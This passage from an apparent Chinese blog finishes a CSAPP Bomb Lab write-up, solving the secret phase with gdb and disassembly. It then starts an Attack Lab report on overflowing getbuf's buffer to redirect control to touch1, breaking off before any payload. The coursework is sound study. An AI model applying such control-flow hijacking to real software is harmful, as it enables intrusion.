40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">  401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  40164b:   00 00</span><br><span class="line">  40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">  401658:   c3                      retq</span><br><span class="line">  401659:   90                      nop</span><br><span class="line">  40165a:   90                      nop</span><br><span class="line">  40165b:   90                      nop</span><br><span class="line">  40165c:   90                      nop</span><br><span class="line">  40165d:   90                      nop</span><br><span class="line">  40165e:   90                      nop</span><br><span class="line">  40165f:   90                      nop</span><br></pre></td></tr></table></figure>

<p>注意到以下片段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">...</span><br><span class="line">40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">40164b:   00 00</span><br><span class="line">40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">401658:   c3                      retq</span><br><span class="line">401659:   90                      nop</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>4015d6: <code>xor %eax,%eax</code> 将 %eax 寄存器设置为 <code>0</code>。</p>
<p>4015d8: <code>cmpl $0x6,0x202181(%rip)</code> 和 4015df: <code>jne 40163f</code> 判断 <code>0x202181(%rip)</code> 的值是否为 <code>6</code>，是则继续执行之后的语句，否则直接跳到 40163f: <code>mov 0x68(%rsp),%rax</code> 返回（这一段详见 5.2.1 节关于 stack canary 的阐述）。</p>
<p><code>0x202181(%rip)</code> 也就是 <code>(0x603760)</code> 存放的是什么？通过 gdb 发现，这个值的初始值为 <code>0</code>，而每通过一关后，这个值便加 <code>1</code>。结合注释（即变量名）<code># 603760</code>，推测它表示输入过的字符串数量，实际上也就是通过的关卡数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   0</span><br><span class="line">(gdb) b phase_1</span><br><span class="line">Breakpoint 2 at 0x400ee0</span><br><span class="line">(gdb) b phase_2</span><br><span class="line">Breakpoint 3 at 0x400efc</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: &#x2F;root&#x2F;Hakula&#x2F;csapp&#x2F;lab2&#x2F;bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400ee0 in phase_1 ()</span><br><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   1</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   2</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>判断这个值是否为 <code>6</code>，也就是判断是否通过了全部 6 个关卡。因此这个隐藏关只有在 6 个关卡都顺利通过后才会开启。</p>
<p>剩下的片段也就是本函数与隐藏关相关的主体部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:   be 19 26 40 00          mov    $0x402619,%esi</span><br><span class="line">4015f5:   bf 70 38 60 00          mov    $0x603870,%edi</span><br><span class="line">4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>

<p>这段代码我们已经十分熟悉。<code>0x402619</code> 指向的应该是一个格式化字符串。使用 gdb 查看地址 <code>0x402619</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">(gdb) x&#x2F;s 0x402619</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>

<p>因此，在某处我们需要按这个格式输入 2 个整数和 1 个字符串。这 2 个整数将被保存在 <code>0x8(%rsp)</code> 和 <code>0xc(%rsp)</code> 中，字符串将被保存在 <code>0x10(%rsp)</code> 中。需要注意的是这里还额外传入了一个地址 <code>0x603870</code>，根据我对系统函数 <code>sscanf</code> 的理解，这应当指的是那个被用来解析的字符串的地址。</p>
<p>读取完毕后，栈内保存的信息为：</p>
<blockquote>
<p>0x8(%rsp) = nums[0]<br>0xc(%rsp) = nums[1]<br>0x10(%rsp) = password</p>
</blockquote>
<p>其中，<code>nums[0]</code> 和 <code>nums[1]</code> 表示 <code>0x603870</code> 指向的字符串中解析得到的（前）2 个整数，<code>password</code> 表示之后解析得到的（前）1 个字符串。</p>
<p>在函数 <code>phase_defused</code> 的入口处设置一个断点。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">(gdb) b phase_defused</span><br></pre></td></tr></table></figure>

<p>每通过一个关卡后，使用 gdb 查看地址 <code>0x603870</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">(gdb) x&#x2F;s 0x603870</span><br></pre></td></tr></table></figure>

<p>发现在通过 Phase 4 后，输出信息产生了变化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7 0&quot;</span><br></pre></td></tr></table></figure>

<p>可见，<code>0x603870</code> 指向的是 Phase 4 中输入的字符串 <code>7 0</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015ff:   83 f8 03                cmp    $0x3,%eax</span><br><span class="line">401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>4015ff: <code>cmp $0x3,%eax</code> 和 401602: <code>jne 401635</code> 判断函数 <code>sscanf</code> 的返回值是否为 <code>3</code>，是则继续执行之后的语句，否则直接跳到 401635: <code>mov $0x402558,%edi</code>，也就是跳过了隐藏关。</p>
<p>于是我们知道，在 Phase 4 中除了需要输入作为密码的 2 个整数外，还需要再额外输入 1 个字符串。这是开启隐藏关的前提条件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401604:   be 22 26 40 00          mov    $0x402622,%esi</span><br><span class="line">401609:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">401613:   85 c0                   test   %eax,%eax</span><br><span class="line">401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>%rdi = 0x10(%rsp) = password<br>%esi = 0x402622</p>
</blockquote>
<p>这段代码我们也已经十分熟悉。<code>0x402622</code> 指向的应该是一个字符串。使用 gdb 查看地址 <code>0x402622</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">(gdb) x&#x2F;s 0x402622</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">0x402622:       &quot;DrEvil&quot;</span><br></pre></td></tr></table></figure>

<p>此后，函数 <code>strings_not_equal</code> 检查 %rdi 和 %rsi 寄存器指向的字符串是否相等，即 <code>password</code> 是否等于 <code>DrEvil</code>，是则返回 <code>0</code>，否则返回 <code>1</code>。</p>
<p>401613: <code>test %eax,%eax</code> 和 401615: <code>jne 401635</code> 判断函数 <code>strings_not_equal</code> 的返回值是否为 <code>0</code>，是则继续执行之后的语句，否则直接跳到 401635: <code>mov $0x402558,%edi</code>，也就是跳过了隐藏关。</p>
<p>因此，在 Phase 4 中需要额外输入的 1 个字符串就是 <code>DrEvil</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>

<p>这段就是输出几行提示文本，待会儿我们可以直接看到。以及，调用函数 <code>secret_phase</code> 开启隐藏关。</p>
<h5 id="8-2-2-开启隐藏关"><a href="#8-2-2-开启隐藏关" class="headerlink" title="8.2.2 开启隐藏关"></a>8.2.2 开启隐藏关</h5><p>运行到 Phase 4 时，在 gdb 中输入修改后的字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">7 0 DrEvil</span><br></pre></td></tr></table></figure>

<p>继续跑完全部 6 个关卡，输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12Curses, you&#39;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br></pre></td></tr></table></figure>

<h5 id="8-2-3-观察函数-secret-phase"><a href="#8-2-3-观察函数-secret-phase" class="headerlink" title="8.2.3 观察函数 secret_phase"></a>8.2.3 观察函数 secret_phase</h5><p>在 bomb.asm 中找到函数 <code>secret_phase</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;secret_phase&gt;:</span><br><span class="line">  401242:   53                      push   %rbx</span><br><span class="line">  401243:   e8 56 02 00 00          callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:   ba 0a 00 00 00          mov    $0xa,%edx</span><br><span class="line">  40124d:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">  401252:   48 89 c7                mov    %rax,%rdi</span><br><span class="line">  401255:   e8 76 f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:   48 89 c3                mov    %rax,%rbx</span><br><span class="line">  40125d:   8d 40 ff                lea    -0x1(%rax),%eax</span><br><span class="line">  401260:   3d e8 03 00 00          cmp    $0x3e8,%eax</span><br><span class="line">  401265:   76 05                   jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:   e8 ce 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:   89 de                   mov    %ebx,%esi</span><br><span class="line">  40126e:   bf f0 30 60 00          mov    $0x6030f0,%edi</span><br><span class="line">  401273:   e8 8c ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:   83 f8 02                cmp    $0x2,%eax</span><br><span class="line">  40127b:   74 05                   je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:   e8 b8 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:   bf 38 24 40 00          mov    $0x402438,%edi</span><br><span class="line">  401287:   e8 84 f8 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:   e8 33 03 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:   5b                      pop    %rbx</span><br><span class="line">  401292:   c3                      retq</span><br><span class="line">  401293:   90                      nop</span><br><span class="line">  401294:   90                      nop</span><br><span class="line">  401295:   90                      nop</span><br><span class="line">  401296:   90                      nop</span><br><span class="line">  401297:   90                      nop</span><br><span class="line">  401298:   90                      nop</span><br><span class="line">  401299:   90                      nop</span><br><span class="line">  40129a:   90                      nop</span><br><span class="line">  40129b:   90                      nop</span><br><span class="line">  40129c:   90                      nop</span><br><span class="line">  40129d:   90                      nop</span><br><span class="line">  40129e:   90                      nop</span><br><span class="line">  40129f:   90                      nop</span><br></pre></td></tr></table></figure>

<p>401243: <code>callq 40149e</code> 调用函数 <code>read_line</code>，其返回值（即输入的一行字符串 <code>str</code>）保存在 %rax 寄存器。</p>
<blockquote>
<p>%rax = str</p>
</blockquote>
<p>401248: <code>mov $0xa,%edx</code> 和 40124d: <code>mov $0x0,%esi</code> 将 %edx 和 %esi 寄存器分别设置为 <code>10</code> 和 <code>0</code>。</p>
<blockquote>
<p>%esi = 0<br>%edx = 10</p>
</blockquote>
<p>400e37: <code>mov %rax,%rdi</code> 将 %rax 寄存器保存的地址传给了 %rdi 寄存器。</p>
<blockquote>
<p>%rdi = %rax = str</p>
</blockquote>
<p>401255: <code>callq 400bd0</code> 调用系统函数 <code>strtol</code>。可以推测出这个函数的作用是将字符串转化为整数，但我对它的参数用法不是很了解。查阅资料得，传入的第 1 个参数 %rdi 是被用来解析的字符串的地址 <code>str</code>，第 2 个参数 %esi 是字符串中需要解析部分的结束地址（这里我们传入的是 <code>NULL</code>，表示不使用这个参数），第 3 个参数 %edx 是这个整数的底数（这里我们传入的是 <code>10</code>，表示十进制）[^7]。最后函数返回值保存在 %rax 寄存器中。</p>
<p>总之，这部分的作用就是读入一个多位的整数。</p>
<blockquote>
<p>%rax = num</p>
</blockquote>
<p>其中，<code>num</code> 表示输入的字符串解析得到的多位整数。</p>
<p>400e37: <code>mov %rax,%rbx</code> 和 40125d: <code>lea -0x1(%rax),%eax</code> 将 %rax 的值传给了 %rbx 寄存器，然后 %rax 的值减 1。</p>
<blockquote>
<p>%rbx = %rax = num<br>%eax = %rax - 1 = num - 1</p>
</blockquote>
<p>401260: <code>cmp $0x3e8,%eax</code> 和 401265: <code>jbe 40126c</code> 判断 %eax 的值是否不超过 <code>0x3e8</code>，是则直接跳到 40126c: <code>mov %ebx,%esi</code>，否则执行 40143a: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的整数应当不超过 <code>1001</code>（无符号数）。</p>
<p>40126c: <code>mov %ebx,%esi</code> 和 40126e: <code>mov $0x6030f0,%edi</code> 将 %ebx 的值传给了 %esi 寄存器，将地址 <code>0x6030f0</code> 传给了 %edi 寄存器。</p>
<blockquote>
<p>%edi = 0x6030f0<br>%esi = %ebx = num</p>
</blockquote>
<p>401273: <code>callq 401204</code> 调用函数 <code>fun7</code>，也就是本关的主体部分。</p>
<p>401278: <code>cmp $0x2,%eax</code> 和 40127b: <code>je 401282</code> 判断函数 <code>fun7</code> 的返回值是否为 <code>2</code>，是则直接跳到 401282: <code>mov $0x402438,%edi</code>，否则执行 40143a: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，函数 <code>fun7</code> 的返回值应当为 <code>2</code>。</p>
<p>之后就是输出一行提示文本，以及一些收尾工作。</p>
<h5 id="8-2-4-观察函数-fun7"><a href="#8-2-4-观察函数-fun7" class="headerlink" title="8.2.4 观察函数 fun7"></a>8.2.4 观察函数 fun7</h5><p>在 bomb.asm 中找到函数 <code>fun7</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;fun7&gt;:</span><br><span class="line">  401204:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  401208:   48 85 ff                test   %rdi,%rdi</span><br><span class="line">  40120b:   74 2b                   je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:   8b 17                   mov    (%rdi),%edx</span><br><span class="line">  40120f:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401211:   7e 0d                   jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:   48 8b 7f 08             mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:   e8 e8 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:   01 c0                   add    %eax,%eax</span><br><span class="line">  40121e:   eb 1d                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401225:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401227:   74 14                   je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:   48 8b 7f 10             mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:   e8 d2 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:   eb 05                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:   b8 ff ff ff ff          mov    $0xffffffff,%eax</span><br><span class="line">  40123d:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401241:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>401217 和 40122d: <code>callq 401204</code> 都调用了函数 <code>fun7</code> 自身，可见这是一个递归函数。</p>
<p>试译成 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// p_node in %rdi, target in %esi</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span>* p_node, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p_node == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    cur_num = *p_node;                          <span class="comment">// cur_num in %edx</span></span><br><span class="line">    <span class="keyword">if</span> (cur_num &gt; target) &#123;</span><br><span class="line">        p_node = *(p_node + <span class="number">1</span>);</span><br><span class="line">        result = fun7(p_node, target);          <span class="comment">// result in %eax</span></span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_num == target) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                    <span class="comment">// cur_num &lt; target</span></span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        p_node = *(p_node + <span class="number">2</span>);</span><br><span class="line">        result = fun7(p_node, target);</span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如此这个递归函数的作用就很清晰了。</p>
<h5 id="8-2-5-确定输入的整数"><a href="#8-2-5-确定输入的整数" class="headerlink" title="8.2.5 确定输入的整数"></a>8.2.5 确定输入的整数</h5><p>接下来，使用 gdb 查看作为参数传入的地址 <code>0x6030f0</code> 开始的连续内存中的值（经试验可知第 60 个 8 bytes 之后的地址中存放的都是无关数据，因此这里只需显示前 60 个地址）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">x&#x2F;60xg 0x6030f0</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6030f0 &lt;n1&gt;:   0x0000000000000024      0x0000000000603110</span><br><span class="line">0x603100 &lt;n1+16&gt;:        0x0000000000603130       0x0000000000000000</span><br><span class="line">0x603110 &lt;n21&gt;:  0x0000000000000008      0x0000000000603190</span><br><span class="line">0x603120 &lt;n21+16&gt;:       0x0000000000603150       0x0000000000000000</span><br><span class="line">0x603130 &lt;n22&gt;:  0x0000000000000032      0x0000000000603170</span><br><span class="line">0x603140 &lt;n22+16&gt;:       0x00000000006031b0       0x0000000000000000</span><br><span class="line">0x603150 &lt;n32&gt;:  0x0000000000000016      0x0000000000603270</span><br><span class="line">0x603160 &lt;n32+16&gt;:       0x0000000000603230       0x0000000000000000</span><br><span class="line">0x603170 &lt;n33&gt;:  0x000000000000002d      0x00000000006031d0</span><br><span class="line">0x603180 &lt;n33+16&gt;:       0x0000000000603290       0x0000000000000000</span><br><span class="line">0x603190 &lt;n31&gt;:  0x0000000000000006      0x00000000006031f0</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:       0x0000000000603250       0x0000000000000000</span><br><span class="line">0x6031b0 &lt;n34&gt;:  0x000000000000006b      0x0000000000603210</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:       0x00000000006032b0       0x0000000000000000</span><br><span class="line">0x6031d0 &lt;n45&gt;:  0x0000000000000028      0x0000000000000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x6031f0 &lt;n41&gt;:  0x0000000000000001      0x0000000000000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603210 &lt;n47&gt;:  0x0000000000000063      0x0000000000000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603230 &lt;n44&gt;:  0x0000000000000023      0x0000000000000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603250 &lt;n42&gt;:  0x0000000000000007      0x0000000000000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603270 &lt;n43&gt;:  0x0000000000000014      0x0000000000000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603290 &lt;n46&gt;:  0x000000000000002f      0x0000000000000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x6032b0 &lt;n48&gt;:  0x00000000000003e9      0x0000000000000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:       0x0000000000000000       0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>结合 8.2.4 节译出的函数 <code>fun7</code> 代码，可以发现这是一个二叉树。二叉树中每个结点是一个结构体，结点所在的地址指向的是数据 <code>val</code>，加上 <code>0x8</code> 后指向的是指针 <code>left</code>，加上 <code>0x10</code> 后指向的是指针 <code>right</code>。</p>
<p>因此，<code>fun7</code> 函数中的 <code>*p_node</code> 即 <code>p_node-&gt;val</code>，<code>*(p_node + 1)</code> 即 <code>p_node-&gt;left</code>，<code>*(p_node + 2)</code> 即 <code>p_node-&gt;right</code>。</p>
<p>根据之前 gdb 的输出信息绘制二叉树（数据已转化为十进制）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">            36</span><br><span class="line">         ／        ＼</span><br><span class="line">      8               50</span><br><span class="line">   ／   ＼          ／   ＼</span><br><span class="line">  6      22       45      107</span><br><span class="line"> &#x2F; \    &#x2F;  \     &#x2F;  \    &#x2F;   \</span><br><span class="line">1   7  20  35   40  47  99  1001</span><br></pre></td></tr></table></figure>

<p>可以发现这其实是一个 BST（Binary Search Tree，二叉查找树），而函数 <code>fun7</code> 的作用为：</p>
<ol>
<li>如果当前结点为 <code>NULL</code>，则返回 <code>0xffffffff</code>（直接爆了）；</li>
<li>如果找到了 <code>target</code>，则返回 <code>0</code>；</li>
<li>如果当前结点的值大于 <code>target</code>，则继续搜索左子树，返回时将左子树的返回值 <code>* 2</code>；</li>
<li>如果当前结点的值小于 <code>target</code>，则继续搜索右子树，返回时将右子树的返回值 <code>* 2 + 1</code>。</li>
</ol>
<p>起始时从根结点 <code>36</code> 开始查找，现在问题转化为：求 <code>target</code> 为何值时，最终的返回值为 <code>2</code>。</p>
<p>由之前的分析，返回值为 <code>2</code> 的条件为：</p>
<ol>
<li>最终找到 <code>target</code> 的值（<code>return 0</code>），此后可以沿右路返回任意次（<code>return 0</code>）；</li>
<li>然后沿左路返回（<code>return 1</code>）；</li>
<li>最后沿右路返回（<code>return 2</code>）。</li>
</ol>
<p>满足条件的结点的值有 2 个：<code>22</code>, <code>20</code>，即为所求。</p>
<p>于是得到本关的 2 个解：<code>22</code>, <code>20</code>。</p>
<h5 id="8-2-6-测试"><a href="#8-2-6-测试" class="headerlink" title="8.2.6 测试"></a>8.2.6 测试</h5><p>这里以 <code>22</code> 为例，在 gdb 中输入 Secret phase 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1</span><br><span class="line">22</span><br></pre></td></tr></table></figure>

<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12Wow! You&#39;ve defused the secret stage!</span><br><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Attack Lab实验报告</title>
    <url>/2020/04/02/1/</url>
    <content><![CDATA[<p><img src="/2020/04/02/1/csapp.jpg" alt></p>
<a id="more"></a>

<h1 id="CSAPP-Attack-Lab-解题报告"><a href="#CSAPP-Attack-Lab-解题报告" class="headerlink" title="CSAPP Attack Lab 解题报告"></a>CSAPP Attack Lab 解题报告</h1><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1:"></a>Level1:</h2><h3 id="目标：执行touch1函数："><a href="#目标：执行touch1函数：" class="headerlink" title="目标：执行touch1函数："></a>目标：执行touch1函数：</h3><p>在本题的讲义中给出了<code>getbuf</code>、<code>test</code>和<code>touch1</code>三个函数的C语言描述：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该题的意图是我们应当利用<code>getbuf</code>中的缓冲区溢出漏洞使得执行<code>getbuf</code>之后重定向至<code>touch1</code>即可。因此我们需要确定<code>BUFFER_SIZE</code>的大小以及<code>touch1</code>函数所在的地址。</p>
<h4 id="首先反编译ctarget"><a href="#首先反编译ctarget" class="headerlink" title="首先反编译ctarget"></a>首先反编译ctarget</h4><p>在Linux上使用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.asm</span><br></pre></td></tr></table></figure>

<p>将<code>ctarget</code>反汇编成<code>ctarget.asm</code></p>
<h4 id="在ctarget上搜索touch1函数以及getbuf函数（可以使用编辑器代码搜索功能）"><a href="#在ctarget上搜索touch1函数以及getbuf函数（可以使用编辑器代码搜索功能）" class="headerlink" title="在ctarget上搜索touch1函数以及getbuf函数（可以使用编辑器代码搜索功能）"></a>在ctarget上搜索touch1函数以及getbuf函数（可以使用编辑器代码搜索功能）</h4><p>可以发现getbuf的汇编代码如下：</p>
